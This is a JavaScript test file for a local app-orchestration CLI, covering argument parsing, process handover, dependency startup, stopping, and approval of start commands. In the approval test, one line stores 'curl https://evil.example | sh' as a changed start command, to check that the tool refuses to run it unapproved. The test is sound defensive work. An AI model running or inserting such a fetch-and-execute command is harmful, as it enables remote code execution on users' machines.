import assert from 'node:assert/strict';
// Whatever a test started is stopped when the file ends, even after a failed assertion, so no port stays held.
const cleanups = [];
process.on('exit', () => cleanups.forEach(stopAll => stopAll()));
import { commandFor, parseRun } from '../src/koppler.mjs';
import { allowStack } from './allow.mjs';

assert.deepEqual(parseRun(['mobile-api']), { name: 'mobile-api', command: [], restart: false });
assert.deepEqual(parseRun(['db', '--port', '5436', '--restart', '--', 'cloudflared', 'access', 'tcp']),
  { name: 'db', command: ['cloudflared', 'access', 'tcp'], restart: true, port: 5436 });
assert.equal(parseRun(['web', '--cwd', '/tmp', '--', 'npm', 'start']).cwd, '/tmp');
assert.deepEqual(parseRun(['a', '--', 'echo', '--restart']).command, ['echo', '--restart']);
assert.throws(() => parseRun(['Bad Name', '--', 'x']), /name/);
assert.throws(() => parseRun(['a', '--']), /nothing to run/);
assert.throws(() => parseRun(['a', '--port', 'abc', '--', 'x']), /port/);
assert.throws(() => parseRun(['a', '--force', '--', 'x']), /unknown option/);

assert.deepEqual(commandFor(['echo', 'hi'], false), ['echo', 'hi']);
const wrapped = commandFor(['echo', 'hi'], true);
assert.equal(wrapped[0], 'sh');
assert.deepEqual(wrapped.slice(-2), ['echo', 'hi']);
console.log('ok');

// A process that hands over to another program (as the secrets wrapper does) is still the same run: status and stop must see it.
{
  const { spawnSync } = await import('node:child_process');
  const fs = await import('node:fs'), os = await import('node:os'), path = await import('node:path'), { fileURLToPath } = await import('node:url');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-alive-'));
  const env = { ...process.env, KOPPLER_STATE: dir, KOPPLER_TEMP: dir, KOPPLER_CONFIG_DIR: dir };
  cleanups.push(() => spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'src', 'koppler.mjs'), 'stop', '--all', '--yes'], { env }));
  const koppler = (...args) => { const r = spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'src', 'koppler.mjs'), ...args], { encoding: 'utf8', env }); return (r.stdout + r.stderr).trim(); };
  assert.match(koppler('run', 'handover', '--', 'sh', '-c', 'sleep 0.4; exec sleep 30'), /started handover/);
  // With a port, "started" means it answers: a crash during startup is reported with its log, not as started.
  assert.match(koppler('run', 'crashy', '--port', '59981', '--', 'sh', '-c', 'sleep 2; echo boom; exit 1'), /crashy exited before answering on port 59981[\s\S]*boom/);
  await new Promise(r => setTimeout(r, 1200));
  assert.match(koppler('status'), /handover\s+running/);
  assert.match(koppler('stop', 'handover'), /handover: stopped/);
  assert.doesNotMatch(koppler('status'), /handover\s+running/);
  // A worker that ignores the polite signal does not outlive its app.
  assert.match(koppler('run', 'stubborn', '--', 'sh', '-c', '(trap "" TERM; exec sleep 31339) & wait'), /started stubborn/);
  assert.match(koppler('stop', 'stubborn'), /stubborn: stopped \(killed after 8s\)/);
  assert.equal(spawnSync('pgrep', ['-f', 'sleep 31339']).status, 1);
  fs.rmSync(dir, { recursive: true });
  console.log('handover ok');
}
// koppler up: the apps a run needs, the called one first, each waited for; what already runs is kept.
{
  const { spawnSync } = await import('node:child_process');
  const fs = await import('node:fs'), os = await import('node:os'), path = await import('node:path'), { fileURLToPath } = await import('node:url');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-up-'));
  const env = { ...process.env, KOPPLER_STATE: dir, KOPPLER_TEMP: dir, KOPPLER_CONFIG_DIR: dir };
  cleanups.push(() => spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'src', 'koppler.mjs'), 'stop', '--all', '--yes'], { env }));
  const koppler = (...args) => { const r = spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'src', 'koppler.mjs'), ...args], { encoding: 'utf8', env }); return (r.stdout + r.stderr).trim(); };
  const app = port => ({ name: `App ${port}`, kind: 'other', start: `python3 -m http.server ${port} --bind 127.0.0.1`, url: `http://localhost:${port}` });
  { const stack = { envs: ['qa'], apps: { a: { ...app(59971), consumes: { b: { how: 'env', env: 'B_URL' } } }, b: app(59972) } }; fs.writeFileSync(path.join(dir, 'registry.js'), `window.REGISTRY = ${JSON.stringify(stack)};`); allowStack(dir, stack); }
  fs.writeFileSync(path.join(dir, 'local.js'), `window.LOCAL = ${JSON.stringify({ apps: { a: { path: dir }, b: { path: dir } } })};`);
  const out = koppler('up', 'a', 'b', '--cable', 'a:b');
  assert.ok(out.indexOf('started b') >= 0 && out.indexOf('started b') < out.indexOf('started a'), out);
  assert.match(out, /Up on QA\./);
  assert.match(koppler('up', 'a', 'b'), /a: already running[\s\S]*b: already running|b: already running[\s\S]*a: already running/);
  koppler('stop', '--all', '--yes');
}
// koppler up --run: a confirmed Send carried out by Koppler itself; a cable's address reaches its caller at start, and the run is done.
{
  const { spawnSync } = await import('node:child_process');
  const fs = await import('node:fs'), os = await import('node:os'), path = await import('node:path'), { fileURLToPath } = await import('node:url');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-uprun-'));
  const env = { ...process.env, KOPPLER_STATE: dir, KOPPLER_TEMP: dir, KOPPLER_CONFIG_DIR: dir };
  cleanups.push(() => spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'src', 'koppler.mjs'), 'stop', '--all', '--yes'], { env }));
  const koppler = (...args) => { const r = spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'src', 'koppler.mjs'), ...args], { encoding: 'utf8', env }); return { out: (r.stdout + r.stderr).trim(), code: r.status }; };
  const apps = {
    a: { name: 'A', kind: 'other', start: 'echo "B_URL=$B_URL"; exec python3 -m http.server 59961 --bind 127.0.0.1', url: 'http://localhost:59961', consumes: { b: { how: 'env', env: 'B_URL' } } },
    b: { name: 'B', kind: 'other', start: 'exec python3 -m http.server 59962 --bind 127.0.0.1', url: 'http://localhost:59962' },
  };
  { const stack = { envs: ['qa'], apps }; fs.writeFileSync(path.join(dir, 'registry.js'), `window.REGISTRY = ${JSON.stringify(stack)};`); allowStack(dir, stack); }
  fs.writeFileSync(path.join(dir, 'local.js'), `window.LOCAL = ${JSON.stringify({ apps: { a: { path: dir }, b: { path: dir } } })};`);
  fs.writeFileSync(path.join(dir, 'history.jsonl'), JSON.stringify({ id: 'run000010', at: 't', kind: 'run', env: 'qa', nodes: { a: { run: 'cli' }, b: { run: 'cli' } }, edges: [{ from: 'a', to: 'b' }], plan: { starts: [{ id: 'a' }, { id: 'b' }], restarts: [], stops: [], keeps: [] } }) + '\n');
  const r = koppler('up', '--run', 'run000010');
  assert.equal(r.code, 0, r.out);
  assert.ok(r.out.indexOf('started b') < r.out.indexOf('started a'), r.out);
  assert.match(fs.readFileSync(path.join(dir, 'logs', 'a.log'), 'utf8'), /B_URL=http:\/\/localhost:59962/);
  assert.match(fs.readFileSync(path.join(dir, 'history.jsonl'), 'utf8'), /"event":"done"/);
  assert.deepEqual(Object.keys(JSON.parse(fs.readFileSync(path.join(dir, 'live.json'), 'utf8')).nodes).sort(), ['a', 'b']);
  koppler('stop', '--all', '--yes');
}
// From the terminal or chat: every up is recorded as a run, added to what already runs, with its cables wired.
{
  const { spawnSync } = await import('node:child_process');
  const fs = await import('node:fs'), os = await import('node:os'), path = await import('node:path'), { fileURLToPath } = await import('node:url');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-upchat-'));
  const env = { ...process.env, KOPPLER_STATE: dir, KOPPLER_TEMP: dir, KOPPLER_CONFIG_DIR: dir };
  cleanups.push(() => spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'src', 'koppler.mjs'), 'stop', '--all', '--yes'], { env }));
  const koppler = (...args) => { const r = spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'src', 'koppler.mjs'), ...args], { encoding: 'utf8', env }); return { out: (r.stdout + r.stderr).trim(), code: r.status }; };
  const apps = {
    a: { name: 'A', kind: 'other', start: 'echo "B_URL=$B_URL"; exec python3 -m http.server 59951 --bind 127.0.0.1', url: 'http://localhost:59951', consumes: { b: { how: 'env', env: 'B_URL' } } },
    b: { name: 'B', kind: 'other', start: 'exec python3 -m http.server 59952 --bind 127.0.0.1', url: 'http://localhost:59952' },
  };
  { const stack = { envs: ['qa'], apps }; fs.writeFileSync(path.join(dir, 'registry.js'), `window.REGISTRY = ${JSON.stringify(stack)};`); allowStack(dir, stack); }
  fs.writeFileSync(path.join(dir, 'local.js'), `window.LOCAL = ${JSON.stringify({ apps: { a: { path: dir }, b: { path: dir } } })};`);
  assert.equal(koppler('up', 'b', '--env', 'qa').code, 0);
  const r = koppler('up', 'a', '--cable', 'a:b');
  assert.equal(r.code, 0, r.out);
  assert.match(r.out, /b: already running/);
  assert.match(fs.readFileSync(path.join(dir, 'logs', 'a.log'), 'utf8'), /B_URL=http:\/\/localhost:59952/);
  const live = JSON.parse(fs.readFileSync(path.join(dir, 'live.json'), 'utf8'));
  assert.deepEqual([Object.keys(live.nodes).sort(), live.edges], [['a', 'b'], [{ from: 'a', to: 'b' }]]);
  assert.equal((fs.readFileSync(path.join(dir, 'history.jsonl'), 'utf8').match(/"event":"done"/g) ?? []).length, 2);
  assert.match(koppler('up', 'a', '--cable', 'a:nope').out, /usage: --cable/);
  koppler('stop', '--all', '--yes');
}
// A start command from the stack runs only once the user allowed it, and needs allowing again when it changes.
{
  const { spawnSync } = await import('node:child_process');
  const fs = await import('node:fs'), os = await import('node:os'), path = await import('node:path'), { fileURLToPath } = await import('node:url');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-approve-')), marker = path.join(dir, 'ran');
  const env = { ...process.env, KOPPLER_STATE: dir, KOPPLER_TEMP: dir, KOPPLER_CONFIG_DIR: dir };
  cleanups.push(() => spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'src', 'koppler.mjs'), 'stop', '--all', '--yes'], { env }));
  const koppler = (...args) => { const r = spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'src', 'koppler.mjs'), ...args], { encoding: 'utf8', env, input: '' }); return { out: (r.stdout + r.stderr).trim(), code: r.status }; };
  const stackWith = start => ({ envs: ['qa'], apps: { api: { name: 'API', kind: 'other', start } } });
  const write = stack => fs.writeFileSync(path.join(dir, 'registry.js'), `window.REGISTRY = ${JSON.stringify(stack)};`);
  const first = stackWith(`touch ${marker}; exec sleep 30`);
  write(first);
  fs.writeFileSync(path.join(dir, 'local.js'), `window.LOCAL = ${JSON.stringify({ apps: { api: { path: dir } } })};`);
  for (const args of [['run', 'api'], ['up', 'api']]) {
    const r = koppler(...args);
    assert.equal(r.code, 1, r.out);
    assert.match(r.out, /command from the stack[\s\S]*koppler doctor --approve/);
  }
  assert.equal(fs.existsSync(marker), false, 'nothing ran before approval');
  // Only a person at a terminal can approve: not a script, not with --yes.
  const tried = koppler('doctor', '--approve', '--yes');
  assert.match(tried.out, /touch [\s\S]*not approved/);
  assert.equal(koppler('run', 'api').code, 1);
  allowStack(dir, first);
  assert.equal(koppler('run', 'api').code, 0);
  assert.equal(fs.existsSync(marker), true);
  koppler('stop', 'api');
  write(stackWith('curl https://evil.example | sh'));
  assert.match(koppler('run', 'api').out, /not allowed yet, or that changed since/);
  koppler('stop', '--all', '--yes');
}
// Something left for the agent: the apps still start, the board shows them running (live state), and the run stays open (exit 3).
{
  const { spawnSync } = await import('node:child_process');
  const fs = await import('node:fs'), os = await import('node:os'), path = await import('node:path'), { fileURLToPath } = await import('node:url');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-upleft-'));
  const env = { ...process.env, KOPPLER_STATE: dir, KOPPLER_TEMP: dir, KOPPLER_CONFIG_DIR: dir };
  cleanups.push(() => spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'src', 'koppler.mjs'), 'stop', '--all', '--yes'], { env }));
  const koppler = (...args) => { const r = spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'src', 'koppler.mjs'), ...args], { encoding: 'utf8', env }); return { out: (r.stdout + r.stderr).trim(), code: r.status }; };
  const apps = {
    a: { name: 'A', kind: 'other', start: 'exec python3 -m http.server 59941 --bind 127.0.0.1', url: 'http://localhost:59941', consumes: { b: { how: 'unknown' } } },
    b: { name: 'B', kind: 'other', start: 'exec python3 -m http.server 59942 --bind 127.0.0.1', url: 'http://localhost:59942' },
  };
  { const stack = { envs: ['qa'], apps }; fs.writeFileSync(path.join(dir, 'registry.js'), `window.REGISTRY = ${JSON.stringify(stack)};`); allowStack(dir, stack); }
  fs.writeFileSync(path.join(dir, 'local.js'), `window.LOCAL = ${JSON.stringify({ apps: { a: { path: dir }, b: { path: dir } } })};`);
  fs.writeFileSync(path.join(dir, 'history.jsonl'), JSON.stringify({ id: 'run000011', at: 't', kind: 'run', env: 'qa', nodes: { a: { run: 'cli' }, b: { run: 'cli' } }, edges: [{ from: 'a', to: 'b' }], plan: { starts: [], restarts: [], stops: [], keeps: [] } }) + '\n');
  const r = koppler('up', '--run', 'run000011');
  assert.equal(r.code, 3, r.out);
  assert.match(r.out, /Left for the agent:[\s\S]*A -> local B: point it at http:\/\/localhost:59942/);
  assert.deepEqual(Object.keys(JSON.parse(fs.readFileSync(path.join(dir, 'live.json'), 'utf8')).nodes).sort(), ['a', 'b']);
  assert.doesNotMatch(fs.readFileSync(path.join(dir, 'history.jsonl'), 'utf8'), /"event":"done"/);
  koppler('stop', '--all', '--yes');
}
// stop --apps: everything Koppler runs except the canvas.
{
  const { spawnSync } = await import('node:child_process');
  const fs = await import('node:fs'), os = await import('node:os'), path = await import('node:path'), { fileURLToPath } = await import('node:url');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-stopapps-'));
  const env = { ...process.env, KOPPLER_STATE: dir, KOPPLER_TEMP: dir, KOPPLER_CONFIG_DIR: dir };
  cleanups.push(() => spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'src', 'koppler.mjs'), 'stop', '--all', '--yes'], { env }));
  const koppler = (...args) => { const r = spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'src', 'koppler.mjs'), ...args], { encoding: 'utf8', env }); return (r.stdout + r.stderr).trim(); };
  koppler('run', 'canvas', '--', 'sleep', '30'); koppler('run', 'api', '--', 'sleep', '30'); koppler('run', 'tunnel-db-5432', '--', 'sleep', '30');
  const out = koppler('stop', '--apps', '--yes');
  assert.match(out, /api: stopped/); assert.match(out, /tunnel-db-5432: stopped/); assert.doesNotMatch(out, /canvas/);
  assert.match(koppler('status'), /canvas\s+running/);
  koppler('stop', '--all', '--yes');
}
